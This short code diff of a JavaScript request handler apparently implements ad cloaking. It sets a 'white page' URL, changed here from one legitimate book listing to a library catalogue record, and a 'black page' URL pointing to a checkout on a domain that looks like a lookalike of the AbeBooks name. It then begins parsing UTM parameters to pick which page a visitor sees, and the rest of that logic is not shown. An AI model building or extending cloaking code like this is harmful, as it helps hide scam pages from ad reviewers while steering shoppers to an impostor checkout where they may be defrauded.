@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.booksamillion.com/p/Caught-Up-Autographed/Navessa-Allen/9781638933465";
+    const whitePageURL = "https://kcls.bibliocommons.com/v2/record/S82C2562381";
     const blackPageURL = "https://wabebookscom.myfunnelish.com/books/buy/checkout";
   
     // Parse the UTM parameters from the request URL
